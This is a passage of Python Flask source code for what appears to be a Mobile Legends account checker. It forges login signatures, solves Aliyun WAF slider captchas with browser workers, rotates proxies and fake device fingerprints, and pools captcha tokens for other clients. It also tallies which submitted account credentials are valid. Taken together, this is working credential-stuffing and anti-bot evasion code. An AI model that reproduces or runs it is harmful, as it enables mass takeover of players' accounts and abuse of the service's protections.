        _spawn_rearm(ctx, page, wid, uses)

        if not txt:
            return None, cookies, "timeout_poll", sid
        if txt.startswith("FETCH_ERR"):
            return None, cookies, txt, sid
        return txt, cookies, None, sid

    except Exception as e:
        try: _spawn_rearm(ctx, page, wid, uses)
        except Exception: pass
        return None, {}, f"browser_error:{type(e).__name__}:{str(e)[:120]}", sid


def _browser_login(account, password):
    """Sync wrapper around _async_browser_login()."""
    if not _HAS_BROWSER:
        return None, {}, "browser_not_available", None
    loop = _ensure_waf_loop()
    fut  = asyncio.run_coroutine_threadsafe(
        _async_browser_login(account, password), loop)
    try:
        return fut.result(timeout=WAF_FETCH_TIMEOUT_S + 60)
    except Exception as e:
        return None, {}, f"timeout_or_error:{e}", None

# * WAF helpers *
def _waf_sign(op, p):
    p = dict(p)
    p["country"] = ""
    l = "".join(
        f"{k}={p[k]}&"
        for k in sorted(p)
        if p[k] is not None and k not in ("only_check", "sms_type")
    )
    return hashlib.md5((l + f"op={op}").encode()).hexdigest()

def _body3(account, pwd):
    p = {"account": account, "md5pwd": hashlib.md5(pwd.encode()).hexdigest()}
    return json.dumps(
        {"op": "new_login_pwd", "sign": _waf_sign("new_login_pwd", p),
         "params": dict(p, country=""), "lang": "en"},
        separators=(",", ":"),
    )

def _classify(t):
    t = str(t).lstrip()
    if t.startswith("{"):
        return "JSON"
    if "potential threats to the server" in t or "<title>405</title>" in t:
        return "BLOCKED"
    if "AliyunCaptcha" in t or "sceneId" in t:
        return "SLIDER"
    if "renderData" in t:
        return "COMPUTE"
    low = t.lower()
    if "<title>403" in low or "access denied" in low:
        return "BLOCKED403"
    if "too many" in low or "rate limit" in low or "\u9891\u7e41" in t:
        return "RATELIMIT"
    if "<html" in low or "<!doctype" in low:
        return "HTML"
    return "LAIN"

_LAYER_HINT = {
    "LAIN":        "empty/plain-text body (device-token drop or proxy interstitial)",
    "HTML":        "unrecognised HTML (WAF/anti-bot interstitial or CDN error page)",
    "BLOCKED403":  "403 access denied",
    "RATELIMIT":   "rate-limited by WAF",
    "COMPUTE":     "JS anti-bot compute page (needs VM harness)",
    "SLIDER":      "captcha challenge re-issued on login POST",
    "BLOCKED":     "405 request-blocked page",
}

def _describe(text, limit=200):
    """Short, log-safe fingerprint of a response body."""
    t = str(text or "")
    snip = t[:limit].replace("\n", " ").replace("\r", " ")
    body = ""
    try:
        j = json.loads(t) if t.lstrip().startswith("{") else None
        if isinstance(j, dict):
            keys = [k for k in ("code", "message", "msg", "error", "Error") if k in j]
            body = " ".join(f"{k}={j[k]}" for k in keys)[:120]
    except Exception:
        pass
    return f"len={len(t)} head={snip!r}" + (f" json<{body}>" if body else "")

def _inject_base(html):
    if "<base" not in html.lower():
        base = '<base href="%s">' % (LOGIN_URL + '/')
        mh = re.search(r"<head[^>]*>", html, re.I)
        if mh:
            html = html[:mh.end()] + base + html[mh.end():]
        else:
            html = base + html
    return html

# * PREFETCH *
_PREFETCH_QUEUE = queue.Queue(maxsize=int(os.getenv("WAF_PREFETCH_QUEUE", "48")))
_PREFETCH_TARGET = int(os.getenv("WAF_PREFETCH_TARGET", "24"))
_PREFETCH_MAX_AGE = 50.0
_fetch_throttle_lock = threading.Lock()
_last_fetch_time = 0.0

def _throttled_fetch_waf():
    global _last_fetch_time
    with _fetch_throttle_lock:
        now = time.time()
        elapsed = now - _last_fetch_time
        if elapsed < 0.15:
            time.sleep(0.15 - elapsed)
        _last_fetch_time = time.time()
        return _fetch_waf()

def _prefetch_worker(delay_startup=0.0):
    if delay_startup > 0:
        time.sleep(delay_startup)
    while True:
        try:
            with pending_logins_lock:
                has_pending = any(e['status'] == 'pending' for e in pending_logins)
            if has_pending and _PREFETCH_QUEUE.qsize() < _PREFETCH_TARGET:
                res = _throttled_fetch_waf()
                if res and res[0]:
                    _PREFETCH_QUEUE.put((res, time.time()))
                    print(f"  \033[96m[PREFETCH POOL] +1 Slider (siap={_PREFETCH_QUEUE.qsize()}/{_PREFETCH_TARGET})\033[0m", flush=True)
                else:
                    time.sleep(0.2)
            else:
                time.sleep(0.1)
        except Exception:
            time.sleep(0.5)

_prefetch_started = False
_prefetch_lock = threading.Lock()

def _ensure_prefetch_pool():
    global _prefetch_started
    with _prefetch_lock:
        if not _prefetch_started:
            _prefetch_started = True
            for i in range(4):
                t = threading.Thread(target=_prefetch_worker, args=(i * 0.15,), daemon=True)
                t.start()

# * /api/waf *
@app.route('/api/waf')
def api_waf():
    cnt, need_reset = _bump_cycle()
    if need_reset:
        drained = 0
        while not _PREFETCH_QUEUE.empty():
            try:
                _PREFETCH_QUEUE.get_nowait()
                drained += 1
            except Exception:
                break
        with pending_logins_lock:
            n_pending = len(pending_logins)
        print(f"  \033[93m* CYCLE BOUNDARY #{cnt} * drained={drained} pending_kept={n_pending}\033[0m", flush=True)
        return jsonify({
            'ok': False, 'error': 'cycle_reset',
            'detail': f'cycle #{cnt} boundary - reload page',
            'cycle_count': cnt, 'cycle_every': CYCLE_EVERY,
        }), 200

    with pending_logins_lock:
        for entry in pending_logins:
            if entry['status'] == 'pending':
                entry['status'] = 'solving'
                pid = entry['id']
                html = entry['waf_html']
                cookies = entry['cookies']
                sid = pid
                with waf_sessions_lock:
                    waf_sessions[sid] = {
                        'sess': entry['sess'],
                        'dev': entry['dev'],
                        'proxy': entry['proxy'],
                        'ua': entry['ua'],
                        'ts': time.time(),
                    }
                print(f"  \033[96m[API /api/waf] SERVING PENDING [{pid}] {entry['account'][:20]} (cycle={cnt})\033[0m", flush=True)
                return jsonify({'ok': True, 'html': html, 'cookies': cookies, 'sid': sid,
                                'pending_id': pid, 'login_body': entry['body'], 'cycle_count': cnt})

    # No pending login waiting — mint a fresh clearance from a warm page.
    html, cookies, err, sid = _fetch_waf()
    if not html:
        return jsonify({
            'ok': False, 'error': 'fetch_failed',
            'detail': err or 'unknown',
            'cycle_count': cnt,
        }), 502
    with waf_sessions_lock:
        if sid and sid not in waf_sessions:
            try:
                dev = random.choice(DEVICES)
                sess = Session(impersonate=dev['imp'], verify=False, proxies=_get_proxy())
                for k, v in (cookies or {}).items():
                    sess.cookies.set(k, v)
                waf_sessions[sid] = {
                    'sess': sess, 'dev': dev, 'proxy': _get_proxy(),
                    'ua': _make_ua(dev), 'ts': time.time(),
                }
            except Exception:
                pass
    return jsonify({'ok': True, 'html': html, 'cookies': cookies, 'sid': sid,
                    'cycle_count': cnt})

# * /api/token *
@app.route('/api/token', methods=['POST'])
def api_recv_token():
    global total_ok
    d = request.get_json(force=True)
    if not d or not d.get('u_asig'):
        return jsonify({'ok': True})

    sig = d['u_asig']
    sid = d.get('sid')
    pending_id = d.get('pending_id')

    if pending_id:
        target = None
        with pending_logins_lock:
            for entry in pending_logins:
                if entry['id'] == pending_id and entry['status'] == 'solving':
                    target = entry
                    break
        if not target:
            print(f"  \033[93m* TOKEN pending_id={pending_id} not in 'solving' state * ignoring (stale solve)\033[0m", flush=True)
            return jsonify({'ok': False, 'error': 'pending_mismatch'})

        age = time.time() - target.get('ts', time.time())
        if age > TOKEN_EXPIRY:
            print(f"  \033[93m* POST-SOLVE SKIPPED [{pending_id}] {target['account'][:20]} * solve is {age:.0f}s old (limit {TOKEN_EXPIRY}s)\033[0m", flush=True)
            with pending_logins_lock:
                target['status'] = 'done'
                target['result'] = {'ok': False, 'error': 'stale_token', 'retryable': True,
                                    'detail': f'token age {age:.0f}s > {TOKEN_EXPIRY}s'}
            return jsonify({'ok': True, 'pending_login': True})

        full_url = d.get('full_url', '')
        if full_url:
            login_url = re.sub(r'^https?://localhost(?::\d+)?', LOGIN_URL.rstrip('/'), full_url)
        else:
            u_atoken = d.get('u_atoken', '')
            u_asig = d.get('u_asig', '')
            from urllib.parse import quote as _uquote
            login_url = LOGIN_URL + '/?u_atoken=' + _uquote(u_atoken, safe='') + '&u_asig=' + _uquote(u_asig, safe='')

        sess = target['sess']
        headers = target['headers']
        body = target['body']
        proxy_short = target['proxy']['https'].split('@')[-1] if target['proxy'] else 'direct'

        pin = target.get('mint_cookies') or {}
        try:
            sess.cookies.clear()
        except Exception:
            pass
        for k, v in pin.items():
            sess.cookies.set(k, v)
        for k, v in (d.get('cookies') or {}).items():
            if k not in pin:
                sess.cookies.set(k, v)

        print(f"  \033[94m-> POST-SOLVE LOGIN [{pending_id}] {target['account'][:20]} proxy={proxy_short} cookies={sorted(pin)}\033[0m", flush=True)

        try:
            r = sess.post(login_url, headers=headers, data=body, timeout=25)
            login_response = r.text
            layer = _classify(login_response)
            print(f"  \033[94m* POST-SOLVE RESULT [{pending_id}] status={r.status_code} {layer} {_describe(login_response)}\033[0m", flush=True)
            with pending_logins_lock:
                target['status'] = 'done'
                if layer == 'JSON':
                    target['result'] = {'ok': True, 'status_code': r.status_code, 'body': login_response}
                else:
                    target['result'] = {
                        'ok': False,
                        'error': f'post_solve_{layer}',
                        'detail': _LAYER_HINT.get(layer, '') + ' | ' + _describe(login_response),
                        'status_code': r.status_code,
                        'body': login_response[:4000],
                        'retryable': True,
                    }
        except Exception as e:
            err = f"post_solve_request_failed: {type(e).__name__}: {e}"
            print(f"  \033[91m* {err}\033[0m", flush=True)
            with pending_logins_lock:
                target['status'] = 'done'
                target['result'] = {'ok': False, 'error': err, 'retryable': True}

        return jsonify({'ok': True, 'pending_login': True})

    dev_info = None
    if sid:
        with waf_sessions_lock:
            if sid in waf_sessions:
                dev_info = waf_sessions[sid].get('dev')
    if dev_info:
        d['device'] = dev_info['model']
        d['impersonate'] = dev_info['imp']
        d['cv'] = dev_info['cv']
        d['brand'] = dev_info['brand']
        d['ver'] = dev_info['ver']
    with lock:
        if sig in known_sigs:
            _log(f"* Duplicate token skipped: {sig[:20]}...", False)
            return jsonify({'ok': True, 'duplicate': True})
        known_sigs.add(sig)
        d['_added'] = time.time()
        token_pool.append(d)
        total_ok += 1
    _log(f"* #{total_ok} asig={sig[:24]}...")
    print(f"  \033[92m* Token #{total_ok}\033[0m * {sig[:30]}...", flush=True)
    _save_token_url(d)
    return jsonify({'ok': True})

@app.route('/api/fail', methods=['POST'])
def api_recv_fail():
    global total_fail
    total_fail += 1
    _log("* Failed", False)
    return jsonify({'ok': True})


@app.route('/api/verdict', methods=['POST'])
def api_recv_verdict():
    """Checker reports one account's outcome: valid | invalid | error."""
    global total_valid, total_invalid
    d = request.get_json(force=True, silent=True) or {}
    kind = (d.get('kind') or '').lower()
    if kind not in ('valid', 'invalid', 'error'):
        return jsonify({'ok': False, 'error': 'bad_kind'}), 400
    with lock:
        if kind == 'valid':
            total_valid += 1
        elif kind == 'invalid':
            total_invalid += 1
    fired = record_login_verdict(kind)
    return jsonify({'ok': True, 'reset': fired})


@app.route('/api/tokens')
def api_consume():
    _track_consumer(request.remote_addr)
    now = time.time()
    with lock:
        while token_pool and (now - token_pool[0].get('_added', now)) > TOKEN_EXPIRY:
            expired = token_pool.pop(0)
            _log(f"* Token expired: {expired.get('u_asig','?')[:20]}...", False)
        if not token_pool:
            return jsonify({'error': 'empty'}), 503
        t = token_pool.pop(0)
        used_sigs.add(t.get('u_asig', ''))
    return jsonify({
        'u_atoken': t.get('u_atoken', ''),
        'u_asig':   t.get('u_asig', ''),
        'cookies':  t.get('cookies', {}),
        'ts':       t.get('ts', 0),
        'device':   t.get('device', ''),
        'impersonate': t.get('impersonate', 'chrome'),
        'cv':       t.get('cv', ''),
        'brand':    t.get('brand', ''),
        'ver':      t.get('ver', ''),
    })

@app.route('/api/token-url')
def api_consume_url():
    _track_consumer(request.remote_addr)
    now = time.time()
    with lock:
        while token_pool and (now - token_pool[0].get('_added', now)) > TOKEN_EXPIRY:
            expired = token_pool.pop(0)
            _log(f"* Token expired: {expired.get('u_asig','?')[:20]}...", False)
        if not token_pool:
            return jsonify({'error': 'empty'}), 503
        t = token_pool.pop(0)
        used_sigs.add(t.get('u_asig', ''))
    atoken = t.get('u_atoken', '')
    asig = t.get('u_asig', '')
    url = f"{LOGIN_URL}/?u_atoken={atoken}&u_asig={asig}"
    return jsonify({
        'ok': True,
        'url': url,
        'cookies': t.get('cookies', {}),
        'ts': t.get('ts', 0),
        'expires_in': max(0, int(TOKEN_EXPIRY - (now - t.get('_added', now)))),
    })

def _try_login_once(account, password, kill_gen_snapshot):
    """Fire one login attempt via the browser-backed login path.

    Order of operations:
      1. Ask the browser to fire the login POST inside a warm page. If the
         WAF injects a slider, it solves it and re-fires — this mints
         acw_sc__v2 alongside acw_tc.
      2. If the browser came back with JSON → it's a normal verdict.
      3. If the browser left a slider visible → queue a pending_login entry
         and wait for SOLVER_JS to finish the drag, then replay via
         /api/token.
    """
    pid = uuid.uuid4().hex[:12]

    # ── Step 1: browser-driven login ──────────────────────────────────────
    txt, cookies, err, sid = _browser_login(account, password)
    if err:
        print(f"  \033[93m* LOGIN [{pid}] {account[:20]} browser err: {err}\033[0m", flush=True)
        return ('retry', f'browser_{err}', None)

    layer = _classify(txt or "")

    # ── Step 2: browser returned JSON → done ──────────────────────────────
    if layer == 'JSON':
        acw = sorted(n for n in cookies if n.startswith("acw"))
        print(f"  \033[92m* LOGIN [{pid}] {account[:20]} JSON via browser (cookies: {acw})\033[0m", flush=True)
        return ('json', txt, 200)

    # ── Step 3: browser left a slider → queue for SOLVER_JS to solve ──────
    if layer == 'SLIDER' or 'AliyunCaptcha' in (txt or "") or 'sceneId' in (txt or ""):
        waf_html = _inject_base(txt)
    else:
        print(f"  \033[93m* LOGIN [{pid}] {account[:20]} browser R1_{layer} — retrying\033[0m", flush=True)
        return ('retry', f'browser_R1_{layer}', None)

    dev = random.choice(DEVICES)
    ua = _make_ua(dev)
    lang_hdr = random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'])
    proxy = _get_proxy()

    try:
        sess = Session(impersonate=dev['imp'], verify=False, proxies=proxy)
    except Exception as e:
        return ('retry', f'session_init:{e}', None)

    for k, v in (cookies or {}).items():
        try:
            sess.cookies.set(k, v)
        except Exception:
            pass

    sec = _make_sec_headers(dev)
    headers = {
        'Content-Type':      'application/json',
        'Accept':            'application/json, text/plain, */*',
        'Accept-Language':   lang_hdr,
        'Origin':            'https://mtacc.mobilelegends.com',
        'Referer':           'https://mtacc.mobilelegends.com/',
        'User-Agent':        ua,
        'X-Requested-With':  'com.mobile.legends',
        'Sec-Fetch-Dest':    'empty',
        'Sec-Fetch-Mode':    'cors',
        'Sec-Fetch-Site':    'same-site',
    }
    headers.update(sec)

    md5pwd = hashlib.md5(password.encode()).hexdigest().lower()
    p = {"account": account, "md5pwd": md5pwd}
    payload = {
        "op": "new_login_pwd",
        "sign": _waf_sign("new_login_pwd", p),
        "params": dict(p, country=""),
        "lang": "en",
    }
    body = json.dumps(payload, separators=(',', ':'))

    entry = {
        'id': pid, 'account': account, 'password': password, 'body': body,
        'sess': sess, 'dev': dev, 'proxy': proxy, 'ua': ua, 'headers': headers,
        'waf_html': waf_html, 'cookies': dict(cookies or {}),
        'mint_cookies': dict(cookies or {}),
        'status': 'pending', 'result': None, 'ts': time.time(),
    }
    with pending_logins_lock:
        pending_logins.append(entry)
    print(f"  \033[96m* LOGIN QUEUED [{pid}] {account[:20]} * waiting for SOLVER_JS drag...\033[0m", flush=True)

    t0 = time.time()
    while time.time() - t0 < 90:
        if _current_kill_gen() != kill_gen_snapshot:
            with pending_logins_lock:
                pending_logins[:] = [e for e in pending_logins if e['id'] != pid]
            print(f"  \033[93m* LOGIN [{pid}] aborted by kill_gen bump\033[0m", flush=True)
            return ('retry', 'killed_by_user', None)
        with pending_logins_lock:
            for e in pending_logins:
                if e['id'] == pid and e['status'] == 'done':
                    result = e['result']
                    pending_logins.remove(e)
                    return ('done', result, None)
        time.sleep(0.3)

    with pending_logins_lock:
        pending_logins[:] = [e for e in pending_logins if e['id'] != pid]
    print(f"  \033[91m* LOGIN TIMEOUT [{pid}] {account[:20]} * slider not solved in 90s\033[0m", flush=True)
    _record_timeout()
    return ('retry', 'captcha_timeout', None)

@app.route('/api/login', methods=['POST'])
def api_login():
    d = request.get_json(force=True)
    if not d or not d.get('account') or not d.get('password'):
        return jsonify({'ok': False, 'error': 'missing_params', 'detail': 'account and password required'}), 400

    account = d['account']
    password = d['password']

    MAX_ATTEMPTS = 3
    last_reason = 'unknown'
    last_attempt = 0
    for attempt in range(1, MAX_ATTEMPTS + 1):
        last_attempt = attempt
        print(f"  \033[96m* LOGIN ATTEMPT {attempt}/{MAX_ATTEMPTS} [{account[:20]}]\033[0m", flush=True)
        kill_snap = _current_kill_gen()
        kind, payload, status_code = _try_login_once(account, password, kill_snap)
        if kind == 'json':
            _record_alive()
            return jsonify({'ok': True, 'status_code': status_code, 'body': payload, 'attempts_used': attempt})
        if kind == 'done':
            _record_alive()
            payload['attempts_used'] = attempt
            return jsonify(payload)
        last_reason = payload
        print(f"  \033[93m* attempt {attempt} failed: {payload}\033[0m", flush=True)
        if payload == 'killed_by_user':
            return jsonify({
                'ok': False, 'error': 'killed_by_user',
                'detail': 'user pressed kill/reset',
                'retryable': True,
            }), 503
        if attempt < MAX_ATTEMPTS:
            time.sleep(1.5 * attempt)


    return jsonify({
        'ok': False, 'error': 'all_attempts_failed',
        'detail': last_reason, 'attempts_used': last_attempt,
    }), 502

@app.route('/api/kill', methods=['POST'])
def api_kill():
    global _prefetch_started, total_fail

    new_gen = _bump_kill_gen()
    old_cycle = _reset_cycle()

    with pending_logins_lock:
        killed_pending = len(pending_logins)
        pending_logins.clear()

    with waf_sessions_lock:
        killed_sessions = len(waf_sessions)
        waf_sessions.clear()

    drained = 0
    while not _PREFETCH_QUEUE.empty():
        try:
            _PREFETCH_QUEUE.get_nowait()
            drained += 1
        except Exception:
            break
    with _prefetch_lock:
        _prefetch_started = False

    total_fail += killed_pending
    _log(f"KILL gen={new_gen} cycle_reset={old_cycle}: sessions={killed_sessions} pending={killed_pending} drained={drained}")
    print(f"  \033[93m* KILL gen={new_gen} cycle_reset={old_cycle} * sessions={killed_sessions} pending={killed_pending} drained={drained}\033[0m", flush=True)

    return jsonify({
        'killed': killed_sessions, 'pending': killed_pending,
        'drained': drained, 'gen': new_gen, 'cycle_reset_from': old_cycle,
    })

@app.route('/api/status')
def api_status():
    el = max(time.time() - t_start, 1)
    now = time.time()
    with lock:
        active = sum(1 for t in token_pool if (now - t.get('_added', now)) <= TOKEN_EXPIRY)
    with pending_logins_lock:
        pending_active = len([e for e in pending_logins if e['status'] in ('pending', 'solving')])
    return jsonify({
        'pool':  active, 'solved': total_ok, 'total_solved': total_ok,
        'failed': total_fail, 'used': len(used_sigs),
        'rate':  round(total_ok / (el / 60), 1), 'uptime': int(el),
        'pending_active': pending_active,
        'valid': total_valid, 'invalid': total_invalid,
        'dead_streak': _dead_streak, 'dead_threshold': DEAD_BATCH_THRESHOLD,
        'kill_gen': _current_kill_gen(),
        'solve_reset_every': CYCLE_EVERY,
        'cycle_every': CYCLE_EVERY,
        'cycle_count': _cycle_count,
        'port': PORT,
        'browser_available': _HAS_BROWSER,
        'warm_size': WARM_SIZE,
    })

@app.route('/api/monitor')
def api_monitor():
    if request.args.get('key', '') != MONITOR_KEY:
        return jsonify({'error': 'key'}), 403
    el = max(time.time() - t_start, 1)
    now = time.time()
    with lock:
        recent = list(token_pool[-10:])
        active_pool = sum(1 for t in token_pool if (now - t.get('_added', now)) <= TOKEN_EXPIRY)
        pool_ages = []
        for t in token_pool:
            age = now - t.get('_added', now)
            remaining = max(0, TOKEN_EXPIRY - age)
            pool_ages.append({'asig': t.get('u_asig','')[:20], 'age': round(age,1), 'remaining': round(remaining,1)})
    with consumer_lock:
        consumers = []
        total_consumed = 0
        for ip, info in consumer_stats.items():
            consumers.append({'ip': ip, 'count': info['count'],
                              'last': int(now - info['last']) if info['last'] else 0})
            total_consumed += info['count']
        consumers.sort(key=lambda x: x['count'], reverse=True)
    success_rate = round((total_ok / max(total_ok + total_fail, 1)) * 100, 1)
    return jsonify({
        'solved': total_ok, 'failed': total_fail, 'pool': active_pool,
        'rate': round(total_ok / (el / 60), 1), 'uptime': int(el),
        'success_rate': success_rate, 'used': len(used_sigs),
        'total_consumed': total_consumed, 'unique_consumers': len(consumers),
        'consumers': consumers[:20], 'pool_ages': pool_ages[:10],
        'token_expiry': TOKEN_EXPIRY,
        'kill_gen': _current_kill_gen(),
        'solve_reset_every': CYCLE_EVERY,
        'cycle_every': CYCLE_EVERY,
        'cycle_count': _cycle_count,
        'log': logs[-50:], 'recent': recent,
        'browser_available': _HAS_BROWSER,
        'warm_size': WARM_SIZE,
    })

@app.route('/api/proxy', methods=['POST'])
def api_proxy():
    d = request.get_json(force=True)
    if not d or not d.get('sid') or not d.get('url'):
        return jsonify({'ok': False, 'error': 'missing sid/url'}), 400
    sid = d['sid']
    with waf_sessions_lock:
        info = waf_sessions.get(sid)
    if not info:
        return jsonify({"Code": "Success", "Success": True}), 200
    dev    = info['dev']
    proxy  = info['proxy']
    ua     = info['ua']
    sess   = info.get('sess')
    method = (d.get('method') or 'GET').upper()
    url    = d['url']
    body   = d.get('body')
    hdrs   = d.get('headers') or {}
    if not sess:
        try:
            sess = Session(impersonate=dev['imp'], verify=False, proxies=proxy)
        except Exception as e:
            return jsonify({'ok': False, 'error': f'session_init: {e}'}), 500
    req_headers = {
        'User-Agent': ua, 'Accept': '*/*',
        'Origin': 'https://g.alicdn.com', 'Referer': 'https://g.alicdn.com/',
    }
    for k, v in hdrs.items():
        kl = k.lower()
        if kl not in ('user-agent', 'host', 'content-length', 'connection'):
            req_headers[k] = v
    req_headers.update(_make_sec_headers(dev))
    proxy_short = proxy['https'].split('@')[-1] if proxy else 'direct'
    try:
        if method == 'GET':
            r = sess.get(url, headers=req_headers, timeout=10)
        else:
            ct = hdrs.get('Content-Type') or hdrs.get('content-type') or 'application/json'
            req_headers['Content-Type'] = ct
            r = sess.post(url, headers=req_headers, data=body, timeout=10)
        is_captcha = 'captcha-open' in (url or '')
        if is_captcha:
            snip = (r.text or '')[:200].replace('\n', ' ').replace('\r', '')
            print(f"  \033[95m* Proxy CAPTCHA {method} * {r.status_code} | req_body={str(body)[:80]} | resp={snip}\033[0m", flush=True)
        else:
            print(f"  \033[95m* Proxy {method} {url[:60]}... * {r.status_code} (sid={sid}, proxy={proxy_short})\033[0m", flush=True)
        resp_headers = {}
        for k in ('content-type',):
            if k in r.headers:
                resp_headers[k] = r.headers[k]
        return Response(r.content, status=r.status_code, headers=resp_headers)
    except Exception as e:
        err = f"Proxy {method} failed: {type(e).__name__}: {e}"
        print(f"  \033[91m* {err}\033[0m", flush=True)
        return jsonify({'ok': False, 'error': err}), 502

# * PAGE ROUTES *
@app.route('/')
def page_solver():
    html = SOLVER_HTML.replace('__PORT__', str(PORT))
    return Response(html, content_type='text/html; charset=utf-8')

@app.route('/multi')
def page_multi():
    n = max(1, min(20, int(request.args.get('n', 4))))
    auto_reset = int(request.args.get('reset', CYCLE_EVERY))
    frames = ''.join(
        f'<iframe src="/" data-slot="{i}" id="f{i}"></iframe>'
        for i in range(n)
    )
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Solver ({n}x)</title>
<style>
:root{{
  --paper:#0d0f12; --panel:#131619; --line:#242a30; --line-soft:#1b2025;
  --ink:#e8edf2; --ink-2:#98a4b0; --ink-3:#8b96a3;
  --pass:#3ddc84; --fail:#ff5a5f; --live:#ffc247; --info:#6aa9ff;
  --mono:ui-monospace,'Cascadia Mono',Consolas,'SF Mono',Menlo,monospace;
  --sans:'Inter var',Inter,'Segoe UI',system-ui,-apple-system,sans-serif;
}}
*{{margin:0;padding:0;box-sizing:border-box}}
html,body{{height:100%}}
body{{
  background:var(--paper);color:var(--ink);
  font:13px/1.45 var(--sans);
  display:flex;flex-direction:column;
  -webkit-font-smoothing:antialiased;
  font-variant-numeric:tabular-nums;
}}
#bar{{
  flex-shrink:0;display:flex;align-items:center;gap:0;
  height:44px;padding:0 12px;background:var(--panel);
  border-bottom:1px solid var(--line);
  overflow-x:auto;overflow-y:hidden;scrollbar-width:none;
}}
#bar::-webkit-scrollbar{{display:none}}
.metric{{display:flex;align-items:baseline;gap:6px;padding:0 12px;height:100%;
  border-right:1px solid var(--line-soft);white-space:nowrap;flex-shrink:0;}}
.metric:first-child{{padding-left:2px}}
.metric .k{{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-3);}}
.metric .v{{font-family:var(--mono);font-size:13px;font-weight:600}}
#m-solved{{color:var(--pass)}} #m-failed{{color:var(--fail)}}
#m-pool{{color:var(--live)}} #m-cycle{{color:var(--info)}} #m-batch{{color:var(--ink)}}
.spacer{{flex:1 1 auto;min-width:8px}}
.slots{{display:flex;align-items:center;gap:3px;flex-shrink:0;padding-left:10px;
  font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink-3);}}
.slots a{{color:var(--ink-2);text-decoration:none;font-family:var(--mono);font-size:11px;
  letter-spacing:0;padding:3px 7px;border-radius:4px;border:1px solid transparent;
  transition:background .14s ease,color .14s ease,border-color .14s ease;}}
.slots a:hover{{background:#1b2025;color:var(--ink);border-color:var(--line)}}
.slots a[aria-current="page"]{{background:#1d2328;color:var(--ink);border-color:#2b3238;}}
.slots a:focus-visible{{outline:2px solid var(--info);outline-offset:1px}}
.slots a{{min-height:32px;display:inline-flex;align-items:center;padding:0 9px}}
#killBtn{{flex-shrink:0;margin-left:10px;font:11px/1 var(--sans);font-weight:600;
  letter-spacing:.02em;color:#c2605f;background:transparent;border:1px solid #3a2526;
  border-radius:5px;padding:6px 12px;cursor:pointer;
  transition:background .14s ease,color .14s ease,border-color .14s ease,transform .06s ease;}}
#killBtn:hover{{background:#2a1718;color:#ff7b80;border-color:#5c2b2d}}
#killBtn:active{{transform:translateY(1px)}}
#killBtn:focus-visible{{outline:2px solid #5c2b2d;outline-offset:2px}}
#grid{{flex:1;min-height:0;display:grid;gap:6px;padding:6px;
  grid-template-columns:repeat(auto-fill,minmax(360px,1fr));
  grid-auto-rows:minmax(0,1fr);overflow:auto;}}
#grid iframe{{width:100%;height:100%;border:1px solid var(--line);border-radius:6px;
  background:#080a0c;display:block;transition:border-color .16s ease;}}
#grid iframe:hover{{border-color:#2e363e}}
@media (max-width:760px){{
  #bar{{height:auto;flex-wrap:wrap;padding:6px 8px;gap:2px}}
  .metric{{border-right:none;padding:2px 8px;height:auto}}
  .slots{{order:9;width:100%;padding-left:8px}}
  #killBtn{{order:10;margin-left:8px}}
  #grid{{grid-template-columns:1fr}}
}}
@media (prefers-reduced-motion:reduce){{*{{transition-duration:.01ms!important}}}}
</style></head><body>

<div id="bar">
  <div class="metric"><span class="k">Solved</span><span class="v" id="m-solved">0</span></div>
  <div class="metric"><span class="k">Fail</span><span class="v" id="m-failed">0</span></div>
  <div class="metric"><span class="k">Pool</span><span class="v" id="m-pool">0</span></div>
  <div class="metric"><span class="k">Cycle</span><span class="v" id="m-cycle">0/0</span></div>
  <div class="metric"><span class="k">Batch</span><span class="v" id="m-batch">0/{auto_reset}</span></div>
  <div class="metric"><span class="k">Rate</span><span class="v" id="m-rate">0/min</span></div>
  <div class="metric"><span class="k">Uptime</span><span class="v" id="m-up">0s</span></div>
  <span class="spacer"></span>
  <nav class="slots" aria-label="Slot count">
    <a href="/multi?n=2">2x</a>
    <a href="/multi?n=4">4x</a>
    <a href="/multi?n=6">6x</a>
    <a href="/multi?n=8">8x</a>
    <a href="/multi?n=10">10x</a>
    <a href="/multi?n=20">20x</a>
  </nav>
  <button id="killBtn" onclick="killReset()">Kill &amp; Reset</button>
</div>

<div id="grid">{frames}</div>

<script>
(function(){{
  const N={n}, AUTO_RESET={auto_reset};
  let baseline=0, baselineSet=false;
  document.querySelectorAll('.slots a').forEach(function(a){{
    if(a.textContent.trim() === N + 'x') a.setAttribute('aria-current','page');
  }});
  async function killReset(){{
    try{{ await fetch('/api/kill',{{method:'POST'}}); }}catch(e){{}}
    document.cookie.split(';').forEach(function(c){{
      const k=c.split('=')[0].trim();
      if(k) document.cookie=k+'=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
    }});
    try{{ localStorage.clear(); }}catch(e){{}}
    try{{ sessionStorage.clear(); }}catch(e){{}}
    try{{ if(window.caches) caches.keys().then(function(ks){{ks.forEach(function(k){{caches.delete(k);}});}}); }}catch(e){{}}
    for(let i=0;i<N;i++){{
      const f=document.getElementById('f'+i);
      if(f) f.src=f.src;
    }}
    baselineSet=false;
  }}
  window.killReset=killReset;
  function softReload(){{
    for(let i=0;i<N;i++){{
      const f=document.getElementById('f'+i);
      if(f) f.src=f.src;
    }}
    baselineSet=false;
  }}
  window.softReload=softReload;
  const el=function(id){{ return document.getElementById(id); }};
  function setText(id, v){{ const n=el(id); if(n && n.textContent!==String(v)) n.textContent=v; }}
  setInterval(async function(){{try{{
    const r=await fetch('/api/status');const j=await r.json();
    if(!baselineSet){{ baseline=j.solved; baselineSet=true; }}
    const batch=j.solved-baseline;
    setText('m-solved', j.solved); setText('m-failed', j.failed);
    setText('m-pool',   j.pool);
    setText('m-cycle',  (j.cycle_count||0)+'/'+(j.cycle_every||120));
    setText('m-batch',  batch+'/'+AUTO_RESET);
    setText('m-rate',   j.rate+'/min'); setText('m-up', j.uptime+'s');
    document.title='S:'+j.solved+' B:'+batch+'/'+AUTO_RESET;
    if(AUTO_RESET>0 && batch>=AUTO_RESET){{ softReload(); }}
  }}catch(e){{}}}},2000);
}})();
</script></body></html>"""

@app.route('/monitor')
def page_monitor():
    if request.args.get('key', '') != MONITOR_KEY:
        return '<div style="font:20px monospace;padding:40px;color:#f44">* Invalid Key</div>', 403
    return Response(MONITOR_HTML, content_type='text/html; charset=utf-8')

# * SOLVER HTML (parent-managed counters, auto-reload) *
